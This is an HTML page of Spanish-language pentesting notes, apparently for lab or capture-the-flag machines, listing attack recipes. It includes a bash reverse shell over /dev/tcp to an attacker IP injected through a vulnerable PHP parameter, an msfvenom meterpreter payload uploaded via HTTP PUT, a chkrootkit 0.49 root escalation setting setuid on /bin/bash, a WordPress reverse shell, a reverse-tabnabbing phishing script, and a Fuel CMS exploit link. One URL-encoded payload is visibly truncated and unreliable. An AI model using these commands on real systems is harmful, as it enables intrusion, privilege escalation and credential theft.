<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Vulnerabilidades</title>
  <link rel="icon" href="/images/terminal.png" type="image/png">
  <style>
    :root {
      --brick-fire: #B22222;
      --fondo-negro: #121212;
      --texto-principal: #e0dcdc;
      --texto-secundario: #b5a6a6;
      --gris-oscuro: #2a2a2a;
    }

    body {
      background-color: var(--fondo-negro);
      color: var(--texto-principal);
      font-family: 'Georgia', serif;
      margin: 0;
      padding: 3rem 1rem;
      line-height: 1.9;
      font-size: 1.18rem;
      max-width: 800px;
      margin-left: auto;
      margin-right: auto;
    }

    h1, h2, h3, h4 {
      color: var(--brick-fire);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin-bottom: 1rem;
      white-space: normal;
      overflow-wrap: break-word;
      line-height: 1.3;
    }

    h1 {
      font-size: 2.8rem;
      margin-top: 0;
      border-bottom: 3px solid var(--brick-fire);
      padding-bottom: 0.3rem;
    }

    h2 {
      font-size: 2rem;
      margin-top: 3rem;
      border-bottom: 1.5px solid var(--brick-fire);
      padding-bottom: 0.25rem;
    }

    h3 {
      font-size: 1.6rem;
      margin-top: 2.5rem;
      border-bottom: 1.5px solid var(--brick-fire);
      padding-bottom: 0.2rem;
    }

    h4 {
      font-size: 1.4rem;
      margin-top: 2rem;
      border-bottom: 1px solid var(--brick-fire);
      padding-bottom: 0.2rem;
    }

    p {
      margin-bottom: 2rem;
      text-align: justify;
      text-justify: inter-word;
    }

    img {
      max-width: 100%;
      border-radius: 12px;
      box-shadow: 0 0 15px var(--brick-fire);
      margin: 2rem auto;
      display: block;
      height: auto;
    }

    blockquote {
      border-left: 5px solid var(--brick-fire);
      padding-left: 1rem;
      color: var(--texto-secundario);
      font-style: italic;
      margin: 2rem 0;
      background-color: var(--gris-oscuro);
      border-radius: 8px;
    }

    a {
      color: var(--brick-fire);
      text-decoration: none;
      border-bottom: 1px dashed var(--brick-fire);
      transition: all 0.3s ease;
    }

    a:hover {
      color: #db5858;
      border-bottom: 1px solid #db5858;
    }

    header, footer {
      text-align: center;
      color: var(--brick-fire);
      margin-bottom: 3rem;
      font-weight: 600;
      letter-spacing: 1px;
    }

    footer {
      margin-top: 5rem;
      font-size: 0.9rem;
    }

    @media (max-width: 600px) {
      body {
        padding: 2rem 1rem;
        font-size: 1rem;
      }

      h1 {
        font-size: 2rem;
      }

      h2 {
        font-size: 1.5rem;
      }

      h3 {
        font-size: 1.3rem;
      }

      h4 {
        font-size: 1.1rem;
      }
    }
	code {
  font-size: 23px;
}
  </style>
</head>
<body>

  <header>
    <h1>Vulnerabilidades</h1>
  </header>

  <article>

    <h2>Shell reversa con php en wp-admin</h2>

    <p>
        Al iniciar sesion en wp-admin, si hay acceso a la seccion Appearance y hay codigo php, se puede pegar codigo de 
        un php para conseguir una shell reversa.
    </p>

     <h2>Nombre personalizado de un dominio en una ip</h2>

    <p>
      Al entrar a una ip, y aparece con un nombre de dominio <code>http://vtcsec</code> y 
      no permite acceder, se soluciona de la siguiente manera.
      Ejecute <code>sudo nano /etc/hosts</code> para acceder al dominio, una vez dentro coloque la ip y el nombre que aparece 
      <code>10.2.168.99	  vtcsec</code>, guardalo y ya se puede acceder al sitio. 
    </p>

    <h2>chkrootkit 0.49</h2>

    <p>Para explotar este chkrootkit desactualizado debemos estar en <code>"/tmp"</code>, luego ejecutar 
      <code> echo "/bin/bash" > /tmp/update </code>, luego <code> echo "chmod +s /bin/bash" >> /tmp/update </code>, y finalmente <code> /bin/bash -p </code>. Con esta serie de comandos
    crea un archivo <code>/tmp/update</code> que, al ejecutarse, establece el setuid en <code>/bin/bash</code> lo que permite 
    ejecutar bash con privilegios elevados y luego ejecuta <code>/bin/bash -p</code> como usuario root.
    </p>

    <h2>Payload php inverso con metasploit y msfvenom a una pagina con metodo HTTP PUT</h2>

    <p>Para verificar si podemos aprovechar y ejecutar este truco, usamos <code>curl -v -X OPTIONS (ip o url)</code>, si acepta metodo PUT, 
      es un buen comienzo. Al tener un servidor con metodo HTTP PUT, se pueden subir archivos con <code>curl -T archivo 
      (ip/ruta/archivo) --http1.0</code>, podemos aprovechar esta vulnerabilidad para subir una shell inversa. 
      <br>Para crear la shell y subirlo a la maquina victima usamos <code>sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip atacante) 
      LPORT=(funciona mejor con el 443) -f raw > archivo</code>. 
      Una vez creado el archivo, ejecutamos metasploit y usamos el <code>exploit/multi/handler</code> y seleccionamos el payload 
      <code>payload/php/meterpreter_reverse_tcp</code>, lo configuramos con nuestra ip atacante y el puerto que hayamos elejido, despues corremos 
      el exploit y ejecutamos la shell que subimos al servidor.
    </p>

    <h2>
      Shell reversa a traves de un sitio web con php inseguro
    </h2>
    <p>
      Si nos encontramos en una situacion como esta <code> http://10.10.10.10/site/busque.php?buscar= [comando] </code>, donde un php permite ejecutar comandos del sistema, podemos aprovechar esto para generar una shell reversa, <code> /bin/bash -c 'bash -i >& /dev/tcp/ip atacante/puerto 0>&1' </code>, este comando debemos colocarlo donde el php nos permite enviar codigo, probablemente tengamos que codificarlo en URL por lo que deberia quedar asi <code> E10%2F443%200%3E%261%27 </code>. <br>Una vez codificado debemos usar dos terminales de la maquina atacante, en una colocamos un <code> nc -lvnp [puerto que hayamos elejido]</code>, y ejecutar en la otra el comando <code> curl "http://10.10.10.10/site/busque.php?buscar=E10%2F443%200%3E%261%27" </code>, finalmente volvemos a la terminal del netcat y ya acabaremos dentro de la maquina.

    </p>

	<h2>Tabnabbing inverso</h2>

	<p>
	Si en una pagina nos encontramos con el parametro <code> target="_blank" </code>, se puede explotar usando una replica de la pagina de inicio de sesión, incitando al administrador a introducir sus credenciales cuando haga clic en nuestro enlace, lo que debe contener es este script:</p>
	<code>

	window.opener.location = ‘http://IP:PUERTO/paginaDeLogin.html';
	
	</code>
	
	<p>
	Una vez creado el script debemos guardarlo como html, y en el directorio donde tengamos el script en html y la pagina de login, abrimos un <code>python3 http.server 80</code>, en otro lado un <code>nc -lvnp [puerto del script]</code> y a esperar a que la victima ponga sus credenciales.	
	</p>
	

	<h2>Exploit Fuel CMS 1.4.1</h2>

	<p>Si en un servidor nos encontramos con un login asi <code>http://IP/structure/index.php/fuel/login/</code> podemos usar un script que inyecta una shell reversa al ejecutarlo <a href="fuelCMS1.4.1.html">Exploit Fuel CMS 1.4.1</a>. Lo ejecutas asi <code>python3 exploit.py</code> </p>
    <h2>
      Directorios de interes
    </h2>
    <p>
      /etc/crontab [se pueden ver que tareas se ejecutan en el sistema periodicamente]
      <br>/var/www/html [se suele alojar un servicio web]
      <br>/var/spool/cron/crontabs/ [archivos cron por usuario]
      <br>/etc/cron.d/ [archivos cron adicionales definidos por el administrador]
      <br>/etc/cron.daily/, /etc/cron.hourly/, /etc/cron.weekly/, /etc/cron.monthly/ [directorios con scripts para ejecutar tareas en intervalos específicos]
      <br>/etc/cron.allow y /etc/cron.deny [archivos para controlar el acceso a cron]
      <br>/etc/anacrontab [tareas periódicas para sistemas que no están siempre encendidos]
    </p>
  </article>

  